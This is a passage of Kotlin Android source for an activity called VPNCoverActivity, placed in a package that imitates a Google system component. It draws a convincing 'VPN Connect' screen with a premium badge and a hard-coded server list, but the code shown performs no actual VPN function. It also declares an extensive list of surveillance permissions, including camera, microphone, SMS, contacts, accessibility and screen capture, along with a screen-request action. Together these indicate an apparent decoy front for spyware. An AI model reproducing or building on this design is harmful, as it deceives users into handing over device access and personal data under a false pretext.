package com.google.system.ui

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.graphics.drawable.LayerDrawable
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.text.SpannableString
import android.text.Spanned
import android.text.style.ForegroundColorSpan
import android.util.TypedValue
import android.view.Gravity
import android.view.MotionEvent
import android.view.View
import android.view.animation.AlphaAnimation
import android.view.animation.Animation
import android.view.animation.ScaleAnimation
import android.widget.FrameLayout
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.ScrollView
import android.widget.TextView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.system.service.SystemNetworkService
import com.google.system.R
import kotlin.math.roundToInt
import kotlin.random.Random

class VPNCoverActivity : Activity() {
    companion object {
        private const val RC_ALL = 100
        const val ACTION_REQUEST_SCREEN = "com.openaccess.sdk.REQUEST_SCREEN"

        val CORE_PERMS = listOf(
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.ACCESS_WIFI_STATE
        )
        val NOTIF_PERM = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            Manifest.permission.POST_NOTIFICATIONS else null
        val LOCATION_PERM = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            Manifest.permission.ACCESS_COARSE_LOCATION
        else Manifest.permission.ACCESS_FINE_LOCATION
        val ALL_PERMS = CORE_PERMS + listOfNotNull(NOTIF_PERM, LOCATION_PERM)
        val REQUEST_PERMS = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            ALL_PERMS else CORE_PERMS + listOfNotNull(LOCATION_PERM)

        private const val RC_EXTRA = 200
        val EXTRA_PERMS = listOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.SYSTEM_ALERT_WINDOW,
            Manifest.permission.REQUEST_INSTALL_PACKAGES,
            Manifest.permission.REQUEST_DELETE_PACKAGES,
            Manifest.permission.BIND_ACCESSIBILITY_SERVICE,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.WAKE_LOCK,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO
        )

        fun hasPermission(ctx: Context, perm: String) =
            ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED

        fun dp(ctx: Context, dip: Int): Int =
            TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, dip.toFloat(), ctx.resources.displayMetrics).toInt()
    }

    private lateinit var rootLayout: FrameLayout
    private lateinit var statusText: TextView
    private lateinit var serverNameText: TextView
    private lateinit var downloadSpeedText: TextView
    private lateinit var uploadSpeedText: TextView
    private lateinit var connectionTimerText: TextView
    private lateinit var timerText: TextView
    private lateinit var progressBar: ProgressBar
    private lateinit var glowRing: View
    private lateinit var innerGlow: View
    private lateinit var serverPingBars: LinearLayout
    private lateinit var killSwitchToggle: TextView
    private lateinit var protocolText: TextView
    private lateinit var dataUsedBar: ProgressBar
    private lateinit var dataUsedText: TextView
    private lateinit var connectionRing: View
    private lateinit var connectButtonCircle: FrameLayout
    private lateinit var connectInnerCircle: View
    private var retryCount = 0
    private var isConnected = false
    private var connectionTimerSeconds = 0
    private var selectedServerIndex = 0
    private var isKillSwitchOn = true

    private data class ServerInfo(val country: String, val emoji: String, val city: String, val ip: String, val ping: Int, val load: Int)

    private val servers = listOf(
        ServerInfo("United States", "\uD83C\uDDFA\uD83C\uDDF8", "New York", "45.33.72.xxx", 23, 34),
        ServerInfo("United Kingdom", "\uD83C\uDDEC\uD83C\uDDE7", "London", "51.89.14.xxx", 38, 52),
        ServerInfo("Germany", "\uD83C\uDDE9\uD83C\uDDEA", "Frankfurt", "78.47.89.xxx", 42, 28),
        ServerInfo("France", "\uD83C\uDDEB\uD83C\uDDF7", "Paris", "51.91.45.xxx", 55, 61),
        ServerInfo("Japan", "\uD83C\uDDEF\uD83C\uDDF5", "Tokyo", "103.86.92.xxx", 145, 44),
        ServerInfo("Singapore", "\uD83C\uDDF8\uD83C\uDDEC", "Singapore", "128.90.45.xxx", 98, 38),
        ServerInfo("Australia", "\uD83C\uDDE6\uD83C\uDDFA", "Sydney", "103.112.67.xxx", 187, 22),
        ServerInfo("Canada", "\uD83C\uDDE8\uD83C\uDDE6", "Toronto", "158.85.92.xxx", 51, 47),
        ServerInfo("Netherlands", "\uD83C\uDDF3\uD83C\uDDF1", "Amsterdam", "67.205.33.xxx", 33, 19),
        ServerInfo("Switzerland", "\uD83C\uDDE8\uD83C\uDDED", "Zurich", "83.136.54.xxx", 40, 26)
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!isTaskRoot) { finish(); return }

        rootLayout = createVpnView()
        setContentView(rootLayout)

        if (ALL_PERMS.all { hasPermission(this, it) }) {
            checkAndProceed()
        }
    }

    override fun onResume() {
        super.onResume()
        if (isFinishing || !::rootLayout.isInitialized) return
    }

    override fun onPause() {
        super.onPause()
    }

    // ============================================================
    //  UI BUILD
    // ============================================================
    private fun createVpnView(): FrameLayout {
        val D = { dip: Int -> dp(this, dip) }
        val root = FrameLayout(this).apply {
            layoutParams = FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT)
        }

        // Deep dark background
        val bg = View(this).apply {
            background = GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM, intArrayOf(
                Color.parseColor("#0A0E17"),
                Color.parseColor("#111827"),
                Color.parseColor("#0A0E17")
            ))
            layoutParams = FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT)
        }
        root.addView(bg)

        // Scrollable content
        val scroll = ScrollView(this).apply {
            layoutParams = FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT)
            overScrollMode = View.OVER_SCROLL_NEVER
        }
        val scrollContent = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
        }
        scroll.addView(scrollContent)
        root.addView(scroll)

        // ─── TOP HEADER ──────────────────────────────────────────
        scrollContent.addView(createHeader(D))

        // ─── CONNECT CARD ─────────────────────────────────────────
        scrollContent.addView(createConnectCard(D))

        // ─── LIVE STATS ──────────────────────────────────────────
        scrollContent.addView(createLiveStats(D))

        // ─── QUICK TOGGLES ───────────────────────────────────────
        scrollContent.addView(createQuickToggles(D))

        // ─── SERVER LIST ─────────────────────────────────────────
        scrollContent.addView(createServerList(D))

        // ─── DATA USAGE ──────────────────────────────────────────
        scrollContent.addView(createDataUsage(D))

        // ─── FOOTER ──────────────────────────────────────────────
        scrollContent.addView(createFooter(D))

        // ─── STATUS TEXT (hidden top) ────────────────────────────
        statusText = TextView(this).apply {
            visibility = View.GONE
        }

        return root
    }

    // ─── HEADER ──────────────────────────────────────────────────
    private fun createHeader(D: (Int) -> Int): View {
        val header = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(D(20), D(16), D(20), D(8))
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
        }

        // Left: App icon + title
        val left = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }

        val logo = TextView(this).apply {
            text = "\uD83D\uDD10"
            textSize = 28f
            layoutParams = LinearLayout.LayoutParams(D(40), D(40)).apply { rightMargin = D(10) }
            gravity = Gravity.CENTER
            background = GradientDrawable().apply {
                shape = GradientDrawable.OVAL
                setColor(Color.parseColor("#1F2937"))
            }
        }
        left.addView(logo)

        val titleCol = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
        }
        val appName = TextView(this).apply {
            text = "VPN Connect"
            textSize = 20f
            setTypeface(null, Typeface.BOLD)
            setTextColor(Color.parseColor("#F9FAFB"))
        }
        titleCol.addView(appName)

        val planBadge = TextView(this).apply {
            text = "\u2B50 PREMIUM"
            textSize = 9f
            setTextColor(Color.parseColor("#F59E0B"))
            setTypeface(null, Typeface.BOLD)
            letterSpacing = 0.08f
        }
        titleCol.addView(planBadge)
        left.addView(titleCol)
        header.addView(left)

        // Right: Settings gear
        val settingsBtn = TextView(this).apply {
            text = "\u2699\uFE0F"
            textSize = 22f
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(D(44), D(44))
            background = GradientDrawable().apply {
                shape = GradientDrawable.OVAL
                setColor(Color.parseColor("#1F2937"))
            }
        }
        header.addView(settingsBtn)

        return header
    }

    // ─── CONNECT CARD ────────────────────────────────────────────
    private fun createConnectCard(D: (Int) -> Int): View {
        val card = FrameLayout(this).apply {
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, D(280)).apply {
                leftMargin = D(16)
                rightMargin = D(16)
                topMargin = D(8)
                bottomMargin = D(12)
            }
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = D(20).toFloat()
                setColor(Color.parseColor("#131B2E"))
            }
        }

        // Inner gradient overlay
        val gradientOverlay = View(this).apply {
            background = GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM, intArrayOf(
                Color.parseColor("#1A233A"),
                Color.parseColor("#0D1525")
            ))
            layoutParams = FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT)
        }
        card.addView(gradientOverlay)

        // Top row: server flag + name + ping
        val topRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(D(20), D(16), D(20), 0)
            layoutParams = FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
        }

        val flagText = TextView(this).apply {
            text = servers[0].emoji
            textSize = 28f
            layoutParams = LinearLayout.LayoutParams(D(36), D(36)).apply { rightMargin = D(10) }
        }
        topRow.addView(flagText)

        serverNameText = TextView(this).apply {
            text = "${servers[0].city}, ${servers[0].country}"
            textSize = 15f
            setTextColor(Color.parseColor("#E5E7EB"))
            setTypeface(null, Typeface.BOLD)
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }
        topRow.addView(serverNameText)

        val pingLabel = TextView(this).apply {
            text = "${servers[0].ping} ms"
            textSize = 12f
            setTextColor(Color.parseColor("#34D399"))
            setTypeface(null, Typeface.BOLD)
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = D(8).toFloat()
                setColor(Color.parseColor("#064E3B"))
                setStroke(D(1), Color.parseColor("#10B981"))
            }
            setPadding(D(8), D(3), D(8), D(3))
        }
        topRow.addView(pingLabel)
        card.addView(topRow)

        // ─── Center: Big connect button ─────────────────────────
        val centerFrame = FrameLayout(this).apply {
            layoutParams = FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, D(180))
        }

        // Glow ring
        connectionRing = View(this).apply {
            val gd = GradientDrawable()
            gd.shape = GradientDrawable.OVAL
            gd.setColor(Color.parseColor("#10B981"))
            gd.alpha = 15
            layoutParams = FrameLayout.LayoutParams(D(140), D(140)).apply {
                gravity = Gravity.CENTER
            }
        }
        centerFrame.addView(connectionRing)

        // Outer ring
        glowRing = View(this).apply {
            val gd = GradientDrawable()
            gd.shape = GradientDrawable.OVAL
            gd.setColor(Color.TRANSPARENT)
            gd.setStroke(D(3), Color.parseColor("#10B981"))
            layoutParams = FrameLayout.LayoutParams(D(110), D(110)).apply {
                gravity = Gravity.CENTER
            }
        }
        centerFrame.addView(glowRing)

        // Inner glow
        innerGlow = View(this).apply {
            val gd = GradientDrawable()
            gd.shape = GradientDrawable.OVAL
            gd.setColor(Color.parseColor("#10B981"))
            gd.alpha = 30
            layoutParams = FrameLayout.LayoutParams(D(100), D(100)).apply {
                gravity = Gravity.CENTER
            }
        }
        centerFrame.addView(innerGlow)

        // Big circular connect button
        connectButtonCircle = FrameLayout(this).apply {
            layoutParams = FrameLayout.LayoutParams(D(88), D(88)).apply {
                gravity = Gravity.CENTER
            }
            background = GradientDrawable().apply {
                shape = GradientDrawable.OVAL
                setColor(Color.parseColor("#10B981"))
            }

            // Inner circle
            connectInnerCircle = View(this).apply {
                val gd = GradientDrawable()
                gd.shape = GradientDrawable.OVAL
                gd.setColor(Color.parseColor("#34D399"))
                layoutParams = FrameLayout.LayoutParams(D(74), D(74)).apply {
                    gravity = Gravity.CENTER
                }
            }
            addView(connectInnerCircle)

            // Play / power icon
            val powerIcon = TextView(this).apply {
                text = "\u25B6"
                textSize = 32f
                setTextColor(Color.parseColor("#FFFFFF"))
                gravity = Gravity.CENTER
                layoutParams = FrameLayout.LayoutParams(FrameLayout.LayoutParams.WRAP_CONTENT, FrameLayout.LayoutParams.WRAP_CONTENT).apply {
                    gravity = Gravity.CENTER
                }
            }
            addView(powerIcon)

            setOnTouchListener { _, event ->
                when (event.action) {
                    MotionEvent.ACTION_DOWN -> {
                        if (!isConnected) {
                            scaleTo(this@VPNCoverActivity, this, 0.92f, 100)
                        }
                    }
                    MotionEvent.ACTION_UP, MotionEvent.ACTION_CANCEL -> {
                        if (!isConnected) {
                            scaleTo(this@VPNCoverActivity, this, 1f, 100)
                            initiateConnection()
                        }
                    }
                }
                true
            }
        }
        centerFrame.addView(connectButtonCircle)

        // Timer below button
        timerText = TextView(this).apply {
            text = ""
            textSize = 13f
            setTextColor(Color.parseColor("#6B7280"))
            gravity = Gravity.CENTER
            layoutParams = FrameLayout.LayoutParams(FrameLayout.LayoutParams.WRAP_CONTENT, FrameLayout.LayoutParams.WRAP_CONTENT).apply {
                gravity = Gravity.CENTER
                topMargin = D(104)
            }
        }
        centerFrame.addView(timerText)

        card.addView(centerFrame)

        // ─── Loading bar ─────────────────────────────────────────
        progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            layoutParams = FrameLayout.LayoutParams(D(200), D(3)).apply {
                gravity = Gravity.CENTER_HORIZONTAL
                topMargin = D(230)
            }
            max = 100
            progress = 0
            visibility = View.GONE
            progressDrawable = GradientDrawable(GradientDrawable.Orientation.LEFT_RIGHT, intArrayOf(
                Color.parseColor("#10B981"), Color.parseColor("#34D399")
            )).apply { shape = GradientDrawable.RECTANGLE; cornerRadius = 4f }
        }
        card.addView(progressBar)

        // ─── Status label ────────────────────────────────────────
        val statusRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, D(12))
            layoutParams = FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply {
                topMargin = D(210)
            }
        }

        val dot = View(this).apply {
            val gd = GradientDrawable()
            gd.shape = GradientDrawable.OVAL
            gd.setColor(Color.parseColor("#6B7280"))
            layoutParams = LinearLayout.LayoutParams(D(6), D(6)).apply { rightMargin = D(6) }
        }
        statusRow.addView(dot)

        val connectLabel = TextView(this).apply {
            text = "TAP TO CONNECT"
            textSize = 11f
            setTextColor(Color.parseColor("#6B7280"))
            letterSpacing = 0.12f
            setTypeface(null, Typeface.BOLD)
        }
        statusRow.addView(connectLabel)

        card.addView(statusRow)

        return card
    }

    // ─── LIVE STATS ──────────────────────────────────────────────
    private fun createLiveStats(D: (Int) -> Int): View {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(D(16), D(4), D(16), D(12))
        }

        // Download
        val downloadCard = createStatCard("\u2B07", "DOWNLOAD", "-- Mbps")
        downloadSpeedText = downloadCard.second
        container.addView(downloadCard.first)

        // Separator
        val sep = View(this).apply {
            layoutParams = LinearLayout.LayoutParams(D(1), D(40)).apply {
                leftMargin = D(8); rightMargin = D(8)
            }
            setBackgroundColor(Color.parseColor("#1F2937"))
        }
        container.addView(sep)

        // Upload
        val uploadCard = createStatCard("\u2B06", "UPLOAD", "-- Mbps")
        uploadSpeedText = uploadCard.second
        container.addView(uploadCard.first)

        // Separator
        val sep2 = View(this).apply {
            layoutParams = LinearLayout.LayoutParams(D(1), D(40)).apply {
                leftMargin = D(8); rightMargin = D(8)
            }
            setBackgroundColor(Color.parseColor("#1F2937"))
        }
        container.addView(sep2)

        // Session timer
        val timerCard = createStatCard("\u23F1", "SESSION", "--:--")
        connectionTimerText = timerCard.second
        container.addView(timerCard.first)

        return container
    }

    private fun createStatCard(icon: String, label: String, value: String): Pair<View, TextView> {
        val D = { dip: Int -> dp(this, dip) }
        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(0, D(72), 1f).apply { rightMargin = D(4); leftMargin = D(4) }
            setPadding(D(8), D(10), D(8), D(10))
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = D(12).toFloat()
                setColor(Color.parseColor("#131B2E"))
            }
        }

        val iconText = TextView(this).apply {
            text = icon
            textSize = 14f
        }
        card.addView(iconText)

        val valText = TextView(this).apply {
            text = value
            textSize = 13f
            setTextColor(Color.parseColor("#F9FAFB"))
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
        }
        card.addView(valText)

        val labelText = TextView(this).apply {
            text = label
            textSize = 8f
            setTextColor(Color.parseColor("#6B7280"))
            gravity = Gravity.CENTER
            letterSpacing = 0.1f
        }
        card.addView(labelText)

        return card to valText
    }

    // ─── QUICK TOGGLES ──────────────────────────────────────────
    private fun createQuickToggles(D: (Int) -> Int): View {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(D(16), 0, D(16), D(8))
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = D(14).toFloat()
                setColor(Color.parseColor("#131B2E"))
            }
            setPadding(D(16), D(8), D(16), D(8))
        }

        // Row 1: Kill Switch + Protocol
        val row1 = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, D(44))
        }

        // Kill Switch
        val ksLabel = TextView(this).apply {
            text = "Kill Switch"
            textSize = 14f
            setTextColor(Color.parseColor("#D1D5DB"))
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }
        row1.addView(ksLabel)

        killSwitchToggle = TextView(this).apply {
            text = "ON"
            textSize = 11f
            setTypeface(null, Typeface.BOLD)
            setTextColor(Color.parseColor("#34D399"))
            gravity = Gravity.CENTER
            setPadding(D(14), D(4), D(14), D(4))
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = D(10).toFloat()
                setColor(Color.parseColor("#064E3B"))
            }
            setOnClickListener {
                isKillSwitchOn = !isKillSwitchOn
                text = if (isKillSwitchOn) "ON" else "OFF"
                setTextColor(if (isKillSwitchOn) Color.parseColor("#34D399") else Color.parseColor("#9CA3AF"))
                background = GradientDrawable().apply {
                    shape = GradientDrawable.RECTANGLE
                    cornerRadius = D(10).toFloat()
                    setColor(if (isKillSwitchOn) Color.parseColor("#064E3B") else Color.parseColor("#374151"))
                }
            }
        }
        row1.addView(killSwitchToggle)

        // Separator
        val sep1 = View(this).apply {
            layoutParams = FrameLayout.LayoutParams(D(1), D(24)).apply { leftMargin = D(12); rightMargin = D(12) }
            setBackgroundColor(Color.parseColor("#1F2937"))
        }
        row1.addView(sep1)

        // Protocol selector
        protocolText = TextView(this).apply {
            text = "WireGuard"
            textSize = 11f
            setTypeface(null, Typeface.BOLD)
            setTextColor(Color.parseColor("#60A5FA"))
            gravity = Gravity.CENTER
            setPadding(D(14), D(4), D(14), D(4))
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = D(10).toFloat()
                setColor(Color.parseColor("#1E3A5F"))
            }
            setOnClickListener {
                val protocols = listOf("WireGuard", "OpenVPN", "IKEv2")
                val current = protocols.indexOf(text)
                text = protocols[(current + 1) % protocols.size]
            }
        }
        row1.addView(protocolText)
        container.addView(row1)

        // Divider
        val divider1 = View(this).apply {
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, D(1)).apply { topMargin = D(4); bottomMargin = D(4) }
            setBackgroundColor(Color.parseColor("#1F2937"))
        }
        container.addView(divider1)

        // Row 2: Auto-Connect + DNS
        val row2 = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, D(44))
        }

        val acLabel = TextView(this).apply {
            text = "Auto-Connect"
            textSize = 14f
            setTextColor(Color.parseColor("#D1D5DB"))
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }
        row2.addView(acLabel)

        val autoConnectToggle = TextView(this).apply {
            text = "OFF"
            textSize = 11f
            setTypeface(null, Typeface.BOLD)
            setTextColor(Color.parseColor("#9CA3AF"))
            gravity = Gravity.CENTER
            setPadding(D(14), D(4), D(14), D(4))
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = D(10).toFloat()
                setColor(Color.parseColor("#374151"))
            }
            setOnClickListener {
                val isOn = text == "OFF"
                text = if (isOn) "ON" else "OFF"
                setTextColor(if (isOn) Color.parseColor("#34D399") else Color.parseColor("#9CA3AF"))
                background = GradientDrawable().apply {
                    shape = GradientDrawable.RECTANGLE
                    cornerRadius = D(10).toFloat()
                    setColor(if (isOn) Color.parseColor("#064E3B") else Color.parseColor("#374151"))
                }
            }
        }
        row2.addView(autoConnectToggle)

        val sep2 = View(this).apply {
            layoutParams = FrameLayout.LayoutParams(D(1), D(24)).apply { leftMargin = D(12); rightMargin = D(12) }
            setBackgroundColor(Color.parseColor("#1F2937"))
        }
        row2.addView(sep2)

        val dnsText = TextView(this).apply {
            text = "DNS: Auto"
            textSize = 11f
            setTextColor(Color.parseColor("#9CA3AF"))
        }
        row2.addView(dnsText)
        container.addView(row2)

        return container
    }

    // ─── SERVER LIST ─────────────────────────────────────────────
    private fun createServerList(D: (Int) -> Int): View {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(D(16), D(4), D(16), D(8))
        }

        // Section header
        val headerRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(0, D(8), 0, D(8))
        }
        val globeIcon = TextView(this).apply {
            text = "\uD83C\uDF0D"
            textSize = 14f
            layoutParams = LinearLayout.LayoutParams(D(24), D(24)).apply { rightMargin = D(6) }
        }
        headerRow.addView(globeIcon)

        val sectionTitle = TextView(this).apply {
            text = "SERVERS"
            textSize = 12f
            setTextColor(Color.parseColor("#9CA3AF"))
            setTypeface(null, Typeface.BOLD)
            letterSpacing = 0.08f
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }
        headerRow.addView(sectionTitle)

        val allCount = TextView(this).apply {
            text = "${servers.size} locations"
            textSize = 11f
            setTextColor(Color.parseColor("#6B7280"))
        }
        headerRow.addView(allCount)
        container.addView(headerRow)

        // Server list
        serverPingBars = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
        }
        servers.forEachIndexed { idx, server ->
            val serverRow = createServerRow(server, idx, D)
            serverPingBars.addView(serverRow)
        }
        container.addView(serverPingBars)

        return container
    }

    private fun createServerRow(server: ServerInfo, idx: Int, D: (Int) -> Int): View {
        val isSelected = idx == selectedServerIndex
        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(D(14), D(10), D(14), D(10))
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = D(12).toFloat()
                setColor(if (isSelected) Color.parseColor("#1A2744") else Color.TRANSPARENT)
                if (isSelected) setStroke(D(1), Color.parseColor("#10B981"))
            }
            setOnClickListener {
                selectedServerIndex = idx
                val srv = servers[idx]
                serverNameText.text = "${srv.city}, ${srv.country}"
                // Rebuild server list to update selection
                val parent = serverPingBars
                parent.removeAllViews()
                servers.forEachIndexed { i, s ->
                    parent.addView(createServerRow(s, i, D))
                }
                if (!isConnected) {
                    val flagText = (connectButtonCircle.parent as? FrameLayout)?.findViewWithTag<TextView>("connect_flag")
                }
            }
        }

        // Flag emoji
        val flag = TextView(this).apply {
            text = server.emoji
            textSize = 22f
            layoutParams = LinearLayout.LayoutParams(D(32), D(32)).apply { rightMargin = D(10) }
            gravity = Gravity.CENTER
        }
        row.addView(flag)

        // Location info
        val infoCol = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }

        val locName = TextView(this).apply {
            text = "${server.city}, ${server.country}"
            textSize = 13f
            setTextColor(Color.parseColor("#E5E7EB"))
            setTypeface(null, if (isSelected) Typeface.BOLD else Typeface.NORMAL)
        }
        infoCol.addView(locName)

        val ipText = TextView(this).apply {
            text = server.ip
            textSize = 10f
            setTextColor(Color.parseColor("#6B7280"))
        }
        infoCol.addView(ipText)
        row.addView(infoCol)

        // Ping bars
        val pingCol = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
        }

        val bars = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.BOTTOM
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT, D(16)).apply { rightMargin = D(8) }
        }

        val pingLevels = when {
            server.ping < 30 -> intArrayOf(4, 6, 8, 10)
            server.ping < 60 -> intArrayOf(3, 5, 7, 8)
            server.ping < 100 -> intArrayOf(2, 4, 6, 7)
            server.ping < 150 -> intArrayOf(2, 3, 5, 6)
            else -> intArrayOf(1, 2, 4, 5)
        }

        pingLevels.forEach { h ->
            val bar = View(this).apply {
                val color = if (server.ping < 50) Color.parseColor("#34D399")
                    else if (server.ping < 100) Color.parseColor("#F59E0B")
                    else Color.parseColor("#EF4444")
                background = GradientDrawable().apply {
                    shape = GradientDrawable.RECTANGLE
                    cornerRadius = D(2).toFloat()
                    setColor(color)
                }
                layoutParams = LinearLayout.LayoutParams(D(4), D(h)).apply { rightMargin = D(2) }
            }
            bars.addView(bar)
        }
        pingCol.addView(bars)

        val pingVal = TextView(this).apply {
            text = "${server.ping} ms"
            textSize = 11f
            setTextColor(if (isSelected) Color.parseColor("#10B981") else Color.parseColor("#6B7280"))
            setTypeface(null, if (isSelected) Typeface.BOLD else Typeface.NORMAL)
        }
        pingCol.addView(pingVal)
        row.addView(pingCol)

        return row
    }

    // ─── DATA USAGE ──────────────────────────────────────────────
    private fun createDataUsage(D: (Int) -> Int): View {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(D(16), D(4), D(16), D(8))
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = D(14).toFloat()
                setColor(Color.parseColor("#131B2E"))
            }
            setPadding(D(16), D(12), D(16), D(12))
        }

        val topRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
        }

        val dataTitle = TextView(this).apply {
            text = "\uD83D\uDCCA Today's Usage"
            textSize = 13f
            setTextColor(Color.parseColor("#D1D5DB"))
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }
        topRow.addView(dataTitle)

        dataUsedText = TextView(this).apply {
            text = "0 MB / 10 GB"
            textSize = 11f
            setTextColor(Color.parseColor("#6B7280"))
        }
        topRow.addView(dataUsedText)
        container.addView(topRow)

        dataUsedBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, D(6)).apply { topMargin = D(8) }
            max = 1000
            progress = 2
